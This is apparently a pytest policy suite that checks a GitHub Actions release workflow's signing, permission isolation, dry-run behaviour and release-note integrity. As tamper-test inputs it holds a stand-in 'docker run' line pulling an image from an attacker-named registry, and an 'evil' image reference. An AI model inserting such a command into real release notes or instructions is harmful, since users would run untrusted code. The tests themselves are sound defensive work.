"""The release workflow builds everything for a release and publishes nothing in a dry run."""

import hashlib
import os
import re
import shutil
import subprocess
from pathlib import Path
from typing import Any

import pytest
import yaml

pytestmark = pytest.mark.policy

REPO = Path(__file__).resolve().parents[3]
WORKFLOWS = REPO / ".github" / "workflows"
RELEASE = WORKFLOWS / "release-image.yml"
SIGNING_SECRETS = (
    "ANDROID_KEYSTORE_BASE64",
    "ANDROID_KEYSTORE_PASSWORD",
    "ANDROID_KEY_ALIAS",
    "ANDROID_KEY_PASSWORD",
)
NOT_DRY = "${{ !inputs.dry_run }}"


def workflow() -> dict[Any, Any]:
    return yaml.safe_load(RELEASE.read_text(encoding="utf-8"))


def steps(job: str) -> list[dict[str, Any]]:
    return workflow()["jobs"][job]["steps"]


def test_the_workflow_is_manual_and_has_a_dry_run() -> None:
    triggers = workflow()[True]  # YAML reads the key `on` as the boolean True
    assert list(triggers) == ["workflow_dispatch"]
    dry_run = triggers["workflow_dispatch"]["inputs"]["dry_run"]
    assert dry_run["type"] == "boolean" and dry_run["default"] is False


def test_jobs_run_source_approval_ci_and_drill_then_gates_apk_image_bundle() -> None:
    jobs = workflow()["jobs"]
    assert list(jobs) == [
        "source",
        "signing-check",
        "secrets-check",
        "ci",
        "drill",
        "gates",
        "android",
        "sign-apk",
        "build-dry",
        "release",
        "bundle",
        "sign-bundle",
    ]
    assert jobs["ci"]["uses"] == "./.github/workflows/ci.yml"
    assert jobs["drill"]["uses"] == "./.github/workflows/release-drill.yml"
    # The approval gate (signing-check, environment release) comes before anything is built.
    for name in ("ci", "drill"):
        assert jobs[name]["needs"] == ["source", "signing-check"] and jobs[name]["if"] == NOT_DRY
    assert jobs["signing-check"]["needs"] == "source" and jobs["signing-check"]["if"] == NOT_DRY
    assert jobs["secrets-check"]["needs"] == "signing-check"
    assert jobs["secrets-check"]["if"] == NOT_DRY
    assert jobs["gates"]["needs"] == ["source", "ci", "drill", "signing-check", "secrets-check"]
    # A skipped ci/drill (dry run) lets the gates run; a failed one does not.
    condition = jobs["gates"]["if"]
    assert (
        "needs.ci.result == 'success'" in condition
        and "needs.drill.result == 'success'" in condition
        and "needs.signing-check.result == 'success'" in condition
        and "needs.secrets-check.result == 'success'" in condition
    )
    assert "inputs.dry_run" in condition
    assert jobs["android"]["needs"] == "gates"
    assert jobs["release"]["needs"] == ["gates", "android"]
    assert jobs["build-dry"]["needs"] == ["gates", "android"]
    assert jobs["sign-apk"]["needs"] == ["gates", "android"]
    assert jobs["bundle"]["needs"] == ["gates", "android", "sign-apk", "release", "build-dry"]
    assert jobs["sign-bundle"]["needs"] == ["gates", "bundle", "release", "sign-apk"]


def test_the_gates_check_the_version_and_signing_check_the_secrets_before_anything_is_built() -> (
    None
):
    text = "\n".join(str(step.get("run", "")) for step in steps("gates"))
    assert "tools/check-version-sync.py" in text and "--release" in text
    # The gates run repository scripts, so they never see a secret; another job checks them.
    assert "secrets." not in yaml.safe_dump(workflow()["jobs"]["gates"])
    check = steps("secrets-check")
    assert not any("checkout" in step.get("uses", "") for step in check)
    env = str(check[0]["env"])
    for secret in SIGNING_SECRETS:
        assert secret in env and secret in check[0]["run"]
    assert "ANDROID_CERT_SHA256" in env and "[0-9a-f]{64}" in check[0]["run"]


def test_the_image_is_multi_arch_and_only_pushed_outside_a_dry_run() -> None:
    build = next(step for step in steps("release") if step.get("id") == "build")
    assert build["with"]["platforms"] == "linux/amd64,linux/arm64"
    assert build["with"]["push"] is True
    assert workflow()["jobs"]["release"]["if"] == NOT_DRY


def jobs_skipped_in_a_dry_run() -> set[str]:
    return {name for name, job in workflow()["jobs"].items() if job.get("if") == NOT_DRY}


def permissions(job: dict[str, Any]) -> dict[str, str]:
    return job.get("permissions", workflow().get("permissions", {}))


def test_no_job_that_can_write_or_sign_runs_in_a_dry_run() -> None:
    """A dry run builds any branch, so its jobs hold no id-token and no write permission."""

    assert permissions({}) == {"contents": "read"}
    skipped = jobs_skipped_in_a_dry_run()
    assert skipped == {
        "ci",
        "drill",
        "signing-check",
        "secrets-check",
        "sign-apk",
        "release",
        "sign-bundle",
    }
    for name, job in workflow()["jobs"].items():
        granted = permissions(job)
        privileged = "id-token" in granted or any(v == "write" for v in granted.values())
        if privileged:
            assert name in skipped, f"job {name} has write or id-token permissions in a dry run"
        elif name not in skipped:
            assert set(granted) <= {"contents", "packages", "pull-requests"}, name
    # The reusable workflows (ci, drill) never inherit id-token or write access either.
    for name in ("ci", "drill"):
        assert "id-token" not in permissions(workflow()["jobs"][name])
        assert "write" not in permissions(workflow()["jobs"][name]).values()


def test_jobs_with_an_id_token_or_registry_write_run_no_repository_script() -> None:
    script = re.compile(
        r"\b(python3?|bash|sh|node|npm|make)\b|(?<![-\w])tools/|backend/|frontend/|\./|\bsource\b"
    )
    for name, job in workflow()["jobs"].items():
        granted = permissions(job)
        if "id-token" not in granted and granted.get("packages") != "write":
            continue
        for step in job["steps"]:
            assert not script.search(str(step.get("run", ""))), (name, step.get("name"))
    # sign-bundle has no repository checkout at all: it only handles the collected files.
    assert not any("checkout" in step.get("uses", "") for step in steps("sign-bundle"))


def test_the_dry_run_build_matches_the_real_build_except_for_pushing() -> None:
    real = next(step for step in steps("release") if step.get("id") == "build")["with"]
    dry = steps("build-dry")[-1]["with"]
    for key in ("push", "outputs", "provenance", "sbom"):
        real.pop(key, None)
        dry.pop(key, None)
    assert real == dry


def test_the_apk_is_signed_with_apksigner_and_verified() -> None:
    sign = next(step for step in steps("sign-apk") if step.get("id") == "sign")
    script = sign["run"]
    assert '/apksigner" verify' in script and "zipalign" in script
    assert "Android Debug" in script and 'EXPECTED_CERT_SHA256,,}" != "$cert"' in script
    assert "apk_sha256=" in script and "$GITHUB_OUTPUT" in script
    assert all(secret in sign["env"] for secret in SIGNING_SECRETS)


def test_every_action_is_pinned_to_a_commit() -> None:
    for job in workflow()["jobs"].values():
        for step in job.get("steps", []):
            if "uses" in step:
                assert re.fullmatch(r"[\w./-]+@[0-9a-f]{40}", step["uses"]), step["uses"]


def test_the_bundle_holds_checksums_notes_and_an_sbom() -> None:
    text = RELEASE.read_text(encoding="utf-8")
    for needed in (
        "SHA256SUMS",
        "sign-blob",
        "sbom-image-",
        "release-notes.md",
        "check-version-sync.py --notes",
    ):
        assert needed in text


def test_no_secret_is_available_at_job_level_or_in_a_dry_run() -> None:
    """A dry run runs code from any branch, so secrets belong only to steps that a dry run skips."""

    for name, job in workflow()["jobs"].items():
        job_level = yaml.safe_dump({k: v for k, v in job.items() if k != "steps"})
        assert "secrets." not in job_level, f"job {name} carries a secret at job level"
        for step in job.get("steps", []):
            if "secrets." in yaml.safe_dump(step) and name not in jobs_skipped_in_a_dry_run():
                assert step.get("if") in (NOT_DRY, "${{ always() && !inputs.dry_run }}"), (
                    name,
                    step.get("name") or step.get("uses"),
                )
    # The patch-and-main check is the first thing a real run does and holds no secret: no
    # repository script runs before the commit is known to be on main.
    check = steps("source")[1]
    assert "main" in str(check.get("name")) and check.get("if") == NOT_DRY
    assert "secrets." not in yaml.safe_dump(workflow()["jobs"]["source"])


STRICT_VERSION = r"^v(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)$"


def test_patch_versions_are_released_like_any_other_version() -> None:
    """The source job checks the shape of the version and the commit, not the patch number."""

    script = steps("source")[1]["run"]
    assert STRICT_VERSION in script
    assert r"\.0$" not in script and "patch version" not in script


def run_gate_step(prefix: str, env: dict[str, str]) -> subprocess.CompletedProcess[str]:
    step = next(s for s in steps("gates") if s.get("name", "").startswith(prefix))
    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("bash is needed to run the workflow steps")
    return subprocess.run(
        [bash, "-c", step["run"]],
        env={"PATH": os.environ["PATH"], **env},
        capture_output=True,
        text=True,
        check=False,
    )


@pytest.mark.parametrize(
    ("version", "accepted"),
    [
        ("v1.2.3", True),
        ("v0.1.0", True),
        ("v10.20.30", True),
        ("v1.2.01", False),
        ("v01.2.3", False),
        ("v1.02.3", False),
        ("v1.2", False),
        ("1.2.3", False),
        ("v1.2.3-rc1", False),
    ],
)
def test_the_version_has_no_leading_zeros(version: str, accepted: bool) -> None:
    result = run_gate_step("Check the version format", {"INPUT_VERSION": version})
    assert (result.returncode == 0) is accepted, result.stderr
    # Every other check of the gates relies on this one coming first.
    names = [s.get("name", "") for s in steps("gates")]
    assert names.index("Check the version format") < names.index(
        "Refuse a breaking migration class for a patch release"
    )
    text = RELEASE.read_text(encoding="utf-8")
    assert "v[0-9]+" not in text  # no version pattern in the workflow accepts a leading zero


def patch_rule(version: str, migration_class: str) -> subprocess.CompletedProcess[str]:
    step = next(s for s in steps("gates") if s.get("name", "").startswith("Refuse a breaking"))
    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("bash is needed to run the workflow steps")
    env = {
        "PATH": os.environ["PATH"],
        "INPUT_VERSION": version,
        "INPUT_MIGRATION_CLASS": migration_class,
    }
    return subprocess.run(
        [bash, "-c", step["run"]], env=env, capture_output=True, text=True, check=False
    )


@pytest.mark.parametrize(
    ("version", "migration_class", "accepted"),
    [
        ("v1.2.0", "expand", True),
        ("v1.2.0", "breaking", True),
        ("v2.0.0", "breaking", True),
        ("v1.2.1", "expand", True),
        ("v1.2.10", "expand", True),
        ("v1.2.1", "breaking", False),
        ("v1.2.10", "breaking", False),
    ],
)
def test_a_patch_release_may_only_declare_the_expand_migration_class(
    version: str, migration_class: str, accepted: bool
) -> None:
    result = patch_rule(version, migration_class)
    assert (result.returncode == 0) is accepted, result.stderr
    if not accepted:
        assert "patch" in result.stderr and "expand" in result.stderr


def test_every_gate_of_a_real_release_still_runs_for_a_patch() -> None:
    gates = workflow()["jobs"]["gates"]
    text = "\n".join(str(step.get("run", "")) for step in gates["steps"])
    for needed in (
        "check-version-sync.py",
        "check-release-migration-class.py",
        "check-license-public-key.py",
    ):
        assert needed in text
    assert "signing-check" in workflow()["jobs"]["gates"]["needs"]


def test_ci_and_drill_are_reusable_and_not_triggered_by_pushes_or_schedules() -> None:
    """Changes are tested locally; the full CI and the drill run as release gates."""

    triggers = {
        name: yaml.safe_load((WORKFLOWS / f"{name}.yml").read_text(encoding="utf-8"))[True]
        for name in ("ci", "audit", "release-drill")
    }
    for name, trigger in triggers.items():
        assert "push" not in trigger and "schedule" not in trigger, name
        assert "workflow_call" in trigger and "workflow_dispatch" in trigger, name
    assert "pull_request" in triggers["ci"]
    # The drill takes the same optional inputs whether it is called or started by hand.
    assert set(triggers["release-drill"]["workflow_call"]["inputs"]) == set(
        triggers["release-drill"]["workflow_dispatch"]["inputs"]
    )
    ci = (WORKFLOWS / "ci.yml").read_text(encoding="utf-8")
    assert "uses: ./.github/workflows/audit.yml" in ci  # the audit is part of the CI gate


def test_the_android_job_builds_only_an_unsigned_apk_and_holds_no_secret() -> None:
    android = workflow()["jobs"]["android"]
    dumped = yaml.safe_dump(android)
    assert "secrets." not in dumped and "vars." not in dumped
    assert 'apksigner" sign' not in dumped and "zipalign" not in dumped
    uploads = [step for step in android["steps"] if "upload-artifact" in step.get("uses", "")]
    assert uploads[0]["with"]["name"] == "android-apk-unsigned"
    assert uploads[0]["with"]["path"].endswith("app-release-unsigned.apk")
    # The pinned build-tools are checked early, also in a dry run.
    check = android["steps"][0]
    assert "ANDROID_BUILD_TOOLS_VERSION" in check["run"] and "if" not in check


def test_the_apk_is_signed_in_isolation_and_its_hash_is_published() -> None:
    job = workflow()["jobs"]["sign-apk"]
    assert job["if"] == NOT_DRY and permissions(job) == {"contents": "read"}
    assert job["outputs"] == {"apk_sha256": "${{ steps.sign.outputs.apk_sha256 }}"}
    forbidden = re.compile(r"checkout|setup-node|setup-java|setup-gradle|cache")
    for step in job["steps"]:
        assert not forbidden.search(step.get("uses", "")), step
        assert not re.search(
            r"npm|npx|gradlew|gradle|(?<![-\w])tools/", str(step.get("run", ""))
        ), step
    first = job["steps"][0]
    assert "download-artifact" in first["uses"] and first["with"]["name"] == "android-apk-unsigned"
    sign = next(step for step in job["steps"] if step.get("id") == "sign")
    # The pinned build-tools of the runner image, never "the newest" and never from the repository.
    assert 'build-tools/${ANDROID_BUILD_TOOLS_VERSION}"' in sign["run"]
    assert "sort -V" not in sign["run"]
    assert re.fullmatch(r"\d+\.\d+\.\d+", workflow()["env"]["ANDROID_BUILD_TOOLS_VERSION"])
    # After signing: the keystore is always removed, then the signed file is uploaded.
    after = job["steps"][job["steps"].index(sign) + 1 :]
    assert after[0]["if"] == "${{ always() }}" and "release.jks" in after[0]["run"]
    assert (
        "upload-artifact" in after[1]["uses"] and after[1]["with"]["name"] == "android-apk-signed"
    )


def test_no_job_with_a_signing_secret_runs_repository_code() -> None:
    script = re.compile(r"\b(python3?|node|npm|npx|make)\b|(?<![-\w])tools/|backend/|frontend/|\./")
    holders = [
        name
        for name, job in workflow()["jobs"].items()
        if any(secret in yaml.safe_dump(job) for secret in SIGNING_SECRETS)
    ]
    assert holders == ["secrets-check", "sign-apk"]
    for name in holders:
        for step in workflow()["jobs"][name]["steps"]:
            assert "checkout" not in step.get("uses", ""), name
            assert not script.search(str(step.get("run", ""))), (name, step.get("name"))


def sign_bundle_step(prefix: str) -> dict[str, Any]:
    return next(
        step
        for step in workflow()["jobs"]["sign-bundle"]["steps"]
        if step.get("name", "").startswith(prefix)
    )


def test_sign_bundle_binds_the_bundle_to_the_trusted_outputs_before_it_signs() -> None:
    job = workflow()["jobs"]["sign-bundle"]
    assert job["env"]["APK_SHA256"] == "${{ needs.sign-apk.outputs.apk_sha256 }}"
    assert job["env"]["DIGEST"] == "${{ needs.release.outputs.digest }}"
    names = [step.get("name", "") for step in job["steps"]]
    check = sign_bundle_step("Check every file")
    write = sign_bundle_step("Write the release notes")
    sign = next(step for step in job["steps"] if "sign-blob" in str(step.get("run", "")))
    order = [job["steps"].index(step) for step in (check, write, sign)]
    assert order == sorted(order), names
    script = check["run"]
    assert 'sha256sum "sidekick-${VERSION}.apk"' in script and '= "$APK_SHA256"' in script
    assert "imagetools inspect" in script and "cmp " in script
    assert "ls -1A" in script  # no file besides the APK and the SBOM, release-notes.md included
    assert "release-notes.md" not in script.split("names=")[1].split("\n")[0]
    # The notes and the checksums are built here, from the commit and the trusted outputs only.
    text = write["run"]
    assert 'CHANGELOG.md?ref=${SHA}"' in text and "gh api" in text
    assert "> release-notes.md" in text and "sha256sum -- release-notes.md" in text
    assert "> SHA256SUMS" in text
    assert job["env"]["SHA"] == "${{ github.sha }}"
    assert permissions(job) == {
        "contents": "read",
        "packages": "read",
        "id-token": "write",
        "attestations": "write",
    }
    assert not any("checkout" in step.get("uses", "") for step in job["steps"])
    # The download is the intermediate bundle, and the finished one is uploaded only after signing.
    assert job["steps"][0]["with"]["name"].startswith("bundle-unsigned-")
    assert job["steps"][-1]["with"]["name"].startswith("release-bundle-")
    # The bundle job makes notes and checksums only for a dry run.
    for name in ("Write the release notes", "Checksums"):
        step = next(item for item in steps("bundle") if item.get("name", "").startswith(name))
        assert step["if"] == "${{ inputs.dry_run }}"


TRUSTED_IMAGE = "ghcr.io/owner/roadlake-sidekick"
TRUSTED_ID = "sha256:" + "a" * 64
RELEASE_SHA = "b" * 40
CHANGELOG = """# Changelog

## [Unreleased]

- Not yet.

## [0.1.0] - 2026-11-12

- A feature.
- Another feature.

## [0.0.9] - 2026-01-01

- Old news.
"""
FOREIGN_RUN = "docker run docker.io/attacker/sidekick:latest"


@pytest.fixture
def sign_bundle_run(tmp_path: Path) -> Any:
    """Runs the real shell of the two sign-bundle steps on a bundle in a temp directory."""

    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("bash is needed to run the workflow steps")
    shim = tmp_path / "bin"
    shim.mkdir()
    registry = shim / "docker"  # stands in for `docker buildx imagetools inspect`
    registry.write_text("#!/bin/sh\nprintf '{\"spdx\": 1}\\n'\n", encoding="utf-8")
    registry.chmod(0o755)
    api = (
        shim / "gh"
    )  # stands in for `gh api`: logs its arguments, prints the changelog of the commit
    api.write_text('#!/bin/sh\necho "$@" >> "$GH_LOG"\ncat "$FAKE_CHANGELOG"\n', encoding="utf-8")
    api.chmod(0o755)
    (tmp_path / "runner").mkdir()

    def run(
        *,
        apk: bytes = b"apk",
        sbom: str = '{"spdx": 1}\n',
        extra: dict[str, str] | None = None,
        changelog: str = CHANGELOG,
    ) -> tuple[subprocess.CompletedProcess[str], Path]:
        dist = tmp_path / "dist"
        shutil.rmtree(dist, ignore_errors=True)
        dist.mkdir()
        (dist / "sbom-image-0.1.0.spdx.json").write_text(sbom, encoding="utf-8")
        (dist / "sidekick-0.1.0.apk").write_bytes(apk)
        for name, text in (extra or {}).items():
            (dist / name).write_text(text, encoding="utf-8")
        (tmp_path / "changelog.md").write_text(changelog, encoding="utf-8")
        env = {
            "PATH": f"{shim}:{os.environ['PATH']}",
            "RUNNER_TEMP": str(tmp_path / "runner"),
            "GH_LOG": str(tmp_path / "gh.log"),
            "FAKE_CHANGELOG": str(tmp_path / "changelog.md"),
            "GH_TOKEN": "not-a-token",
            "REPOSITORY": "owner/repo",
            "SHA": RELEASE_SHA,
            "VERSION": "0.1.0",
            "IMAGE": TRUSTED_IMAGE,
            "DIGEST": TRUSTED_ID,
            "APK_SHA256": hashlib.sha256(b"apk").hexdigest(),
            "MIGRATION_CLASS": "expand",
            "SCHEMA_HEAD": "001_baseline",
            "WORKFLOW_REF": "owner/repo/.github/workflows/release-image.yml@refs/heads/main",
            "SERVER_URL": "https://github.com",
        }
        for prefix in ("Check every file", "Write the release notes"):
            result = subprocess.run(
                [bash, "-c", sign_bundle_step(prefix)["run"]],
                cwd=tmp_path,
                env=env,
                capture_output=True,
                text=True,
                check=False,
            )
            if result.returncode != 0:
                return result, dist
        return result, dist

    return run


def test_sign_bundle_builds_the_notes_from_the_commit_and_the_trusted_outputs(
    sign_bundle_run: Any, tmp_path: Path
) -> None:
    result, dist = sign_bundle_run()
    assert result.returncode == 0, result.stderr
    # The changelog was read through the API at exactly the release commit.
    assert f"repos/owner/repo/contents/CHANGELOG.md?ref={RELEASE_SHA}" in (
        tmp_path / "gh.log"
    ).read_text(encoding="utf-8")
    notes = (dist / "release-notes.md").read_text(encoding="utf-8")
    assert "- A feature." in notes and "- Another feature." in notes
    assert "Old news" not in notes and "Not yet" not in notes  # only this version's section
    assert notes.count("- Image: ") == 1
    assert f"- Image: `{TRUSTED_IMAGE}@{TRUSTED_ID}`" in notes
    sums = (dist / "SHA256SUMS").read_text(encoding="utf-8").splitlines()
    assert sorted(line.split("  ")[1] for line in sums) == [
        "release-notes.md",
        "sbom-image-0.1.0.spdx.json",
        "sidekick-0.1.0.apk",
    ]
    assert subprocess.run(["sha256sum", "-c", "SHA256SUMS"], cwd=dist, check=False).returncode == 0


@pytest.mark.parametrize(
    "tampered",
    [
        # A foreign install command, or a wrong image under the right hash, in bundle notes.
        f"- A feature.\n\n{FOREIGN_RUN}\n",
        f"- A feature.\n<!-- ghcr.io/evil/roadlake-sidekick@{TRUSTED_ID} -->\n",
    ],
)
def test_notes_from_the_bundle_job_are_refused_and_never_reach_the_signed_text(
    sign_bundle_run: Any, tampered: str
) -> None:
    result, dist = sign_bundle_run(extra={"release-notes.md": tampered})
    assert result.returncode != 0 and "other files than expected" in result.stderr
    assert not (dist / "SHA256SUMS").exists()  # nothing was written for signing


def test_a_foreign_docker_run_line_cannot_get_into_the_signed_notes(
    sign_bundle_run: Any,
) -> None:
    """The signed notes come from the commit and the trusted outputs alone."""

    result, dist = sign_bundle_run()
    assert result.returncode == 0, result.stderr
    signed_text = (dist / "release-notes.md").read_text(encoding="utf-8")
    assert "attacker" not in signed_text and "docker run" not in signed_text


def test_sign_bundle_refuses_a_swapped_apk_sbom_or_extra_file(sign_bundle_run: Any) -> None:
    result, _ = sign_bundle_run(apk=b"swapped")
    assert result.returncode != 0 and "differs from the one sign-apk signed" in result.stderr
    result, _ = sign_bundle_run(sbom='{"spdx": 2}\n')
    assert result.returncode != 0 and "SBOM differs" in result.stderr
    result, _ = sign_bundle_run(extra={"release-manifest.json": "x"})
    assert result.returncode != 0 and "other files than expected" in result.stderr


def test_sign_bundle_refuses_a_changelog_without_a_dated_section_for_the_version(
    sign_bundle_run: Any,
) -> None:
    for changelog in (
        "# Changelog\n\n## [Unreleased]\n\n- 0.1.0 is planned.\n",  # not released yet
        "# Changelog\n\n## [0.1.0]\n\n- No date.\n",
        "# Changelog\n\n## [0.1.0] - 2026-11-12\n\n## [0.0.9] - 2026-01-01\n\n- Old.\n",  # empty
    ):
        result, dist = sign_bundle_run(changelog=changelog)
        assert result.returncode != 0 and "refusing" in result.stderr
        assert not (dist / "SHA256SUMS").exists()


def test_each_image_platform_is_scanned_before_the_image_is_signed() -> None:
    release = steps("release")
    scans = [step for step in release if "trivy-action" in step.get("uses", "")]
    assert sorted(step["env"]["TRIVY_PLATFORM"] for step in scans) == [
        "linux/amd64",
        "linux/arm64",
    ]
    sign = next(i for i, step in enumerate(release) if "cosign sign --yes" in str(step.get("run")))
    for step in scans:
        assert release.index(step) < sign
        assert step["with"]["exit-code"] == "1"
        assert "steps.build.outputs" in step["with"]["image-ref"]


SIGNING_ENVIRONMENT_JOBS = {"secrets-check", "sign-apk", "release", "sign-bundle"}


def needs_closure(job: str) -> set[str]:
    """Every job that has to succeed before `job` runs, directly or through other jobs."""

    jobs = workflow()["jobs"]
    pending = list(_as_list(jobs[job].get("needs", [])))
    seen: set[str] = set()
    while pending:
        name = pending.pop()
        if name not in seen:
            seen.add(name)
            pending.extend(_as_list(jobs[name].get("needs", [])))
    return seen


def _as_list(value: Any) -> list[str]:
    return [value] if isinstance(value, str) else list(value)


def test_the_owner_approves_once_at_one_gate_and_the_signing_jobs_cannot_skip_it() -> None:
    """Only `signing-check` is in the reviewed environment `release`; the rest need it."""

    jobs = workflow()["jobs"]
    reviewed = {name for name, job in jobs.items() if job.get("environment") == "release"}
    assert reviewed == {"signing-check"}
    gate = jobs["signing-check"]
    assert gate["if"] == NOT_DRY and "secrets." not in yaml.safe_dump(gate)
    assert not any("checkout" in step.get("uses", "") for step in gate["steps"])
    # Every job with a secret, a signature or a push waits for the gate; a dry run never reaches it.
    in_signing = {name for name, job in jobs.items() if job.get("environment") == "release-signing"}
    assert in_signing == SIGNING_ENVIRONMENT_JOBS
    assert jobs_skipped_in_a_dry_run() >= SIGNING_ENVIRONMENT_JOBS | reviewed
    for name in in_signing:
        assert "signing-check" in needs_closure(name), name
        assert jobs[name]["if"] == NOT_DRY, name
    # Nothing that signs, pushes or reads a secret sits outside the signing environment.
    for name, job in jobs.items():
        text = yaml.safe_dump(job)
        granted = permissions(job)
        privileged = "id-token" in granted or any(v == "write" for v in granted.values())
        if privileged or "secrets.ANDROID" in text or "cosign sign" in text:
            assert name in in_signing, name
    # The signing secrets are the environment's: no job outside it reads them.
    outside = set(jobs) - in_signing
    assert all("secrets.ANDROID" not in yaml.safe_dump(jobs[n]) for n in outside)


def test_nothing_is_built_before_the_owner_has_approved() -> None:
    jobs = workflow()["jobs"]
    for name in ("ci", "drill", "secrets-check", "gates", "android", "release", "sign-apk"):
        assert "signing-check" in needs_closure(name), name
    # source is the only job that runs before the approval, and it builds nothing.
    assert jobs["signing-check"]["needs"] == "source"
    assert not any(
        "docker/build-push-action" in step.get("uses", "") for step in jobs["source"]["steps"]
    )


def test_the_image_is_signed_keyless_and_carries_an_sbom_and_provenance() -> None:
    build = next(step for step in steps("release") if step.get("id") == "build")["with"]
    assert build["sbom"] is True and build["provenance"] == "mode=max"
    sign = next(step for step in steps("release") if "cosign sign --yes" in str(step.get("run")))
    assert "--key" not in sign["run"]  # keyless: the identity is the workflow, via GitHub OIDC
    assert "id-token" in permissions(workflow()["jobs"]["release"])


def attest_steps(job: str) -> list[dict[str, Any]]:
    return [s for s in steps(job) if "attest-build-provenance" in s.get("uses", "")]


def test_the_release_files_and_the_image_have_build_provenance_attestations() -> None:
    (files,) = attest_steps("sign-bundle")
    subjects = files["with"]["subject-path"]
    for name in ("sidekick-", ".apk", "sbom-image-", "SHA256SUMS", "release-notes.md"):
        assert name in subjects
    # After the checks and the signature of the checksums, never before.
    job_steps = steps("sign-bundle")
    sign = next(i for i, s in enumerate(job_steps) if "sign-blob" in str(s.get("run", "")))
    assert job_steps.index(files) > sign
    (image,) = attest_steps("release")
    assert image["with"]["push-to-registry"] is True
    assert "steps.build.outputs.digest" in image["with"]["subject-digest"]
    # attestations: write and id-token only on the jobs that attest, never anywhere else.
    attesting = {
        name
        for name, job in workflow()["jobs"].items()
        if permissions(job).get("attestations") == "write"
    }
    assert attesting == {"release", "sign-bundle"}
    for name in attesting:
        assert permissions(workflow()["jobs"][name])["id-token"] == "write"


def test_the_release_notes_carry_the_verification_commands(
    sign_bundle_run: Any,
) -> None:
    result, dist = sign_bundle_run()
    assert result.returncode == 0, result.stderr
    notes = (dist / "release-notes.md").read_text(encoding="utf-8")
    image = f"{TRUSTED_IMAGE}@{TRUSTED_ID}"
    for command in (
        f"cosign verify {image}",
        f"gh attestation verify oci://{image} --repo owner/repo",
        "cosign verify-blob SHA256SUMS --bundle SHA256SUMS.sigstore.json",
        "sha256sum -c SHA256SUMS",
        "gh attestation verify sidekick-0.1.0.apk --repo owner/repo",
        "gh attestation verify sbom-image-0.1.0.spdx.json --repo owner/repo",
        "gh attestation verify SHA256SUMS --repo owner/repo",
        "apksigner verify",
        "--certificate-oidc-issuer https://token.actions.githubusercontent.com",
    ):
        assert command in notes, command


@pytest.mark.parametrize("name", ["release.md", "release.sv.md"])
def test_the_maintainer_guide_describes_the_approval_and_the_verification(name: str) -> None:
    text = (REPO / "docs" / "maintainers" / name).read_text(encoding="utf-8")
    for needed in (
        "Required reviewers",
        "`signing-check`",
        "release-signing",
        "gh attestation verify",
        "cosign verify",
        "cosign verify-blob",
        "sha256sum -c SHA256SUMS",
        "git tag -s",
        "git tag -v",
    ):
        assert needed in text, needed
    # release-signing has no reviewers, so limiting it to main is mandatory, and the guide says so.
    assert "MUST" in text or "MÅSTE" in text
    assert "refuses a patch version" not in text and "vägrar en patchversion" not in text


def git(repo: Path, *args: str) -> None:
    subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args],
        cwd=repo,
        check=True,
        capture_output=True,
    )


def version_order(
    tmp_path: Path, tags: list[str], version: str
) -> subprocess.CompletedProcess[str]:
    step = next(
        s for s in steps("gates") if s.get("name", "").startswith("Require a version above")
    )
    bash = shutil.which("bash")
    if bash is None or shutil.which("git") is None:
        pytest.skip("bash and git are needed to run the workflow steps")
    repo = tmp_path / "repo"
    shutil.rmtree(repo, ignore_errors=True)
    repo.mkdir()
    git(repo, "init", "-q")
    git(repo, "commit", "-q", "--allow-empty", "-m", "x")
    for tag in tags:
        git(repo, "tag", tag)
    env = {"PATH": os.environ["PATH"], "INPUT_VERSION": version}
    return subprocess.run(
        [bash, "-c", step["run"]], cwd=repo, env=env, capture_output=True, text=True, check=False
    )


@pytest.mark.parametrize(
    ("tags", "version", "accepted"),
    [
        ([], "v0.1.0", True),  # the first release
        (["v0.1.0"], "v0.1.1", True),
        (["v0.1.0"], "v0.2.0", True),
        (["v0.9.0", "v0.10.0"], "v0.10.1", True),  # numeric, not alphabetical
        (["v1.2.3"], "v2.0.0", True),
        (["v0.1.0-rc1", "not-a-release"], "v0.0.5", True),  # only plain vX.Y.Z tags count
        (["v0.1.01"], "v0.0.5", True),  # a tag with a leading zero is not a release tag
        (["v0.1.0"], "v0.1.0", False),
        (["v0.2.0"], "v0.1.9", False),
        (["v0.9.0", "v0.10.0"], "v0.9.1", False),
        (["v1.0.0", "v0.5.0"], "v0.9.9", False),
    ],
)
def test_the_version_must_be_higher_than_every_release_tag(
    tmp_path: Path, tags: list[str], version: str, accepted: bool
) -> None:
    result = version_order(tmp_path, tags, version)
    assert (result.returncode == 0) is accepted, result.stderr
    if not accepted:
        assert "not higher than" in result.stderr
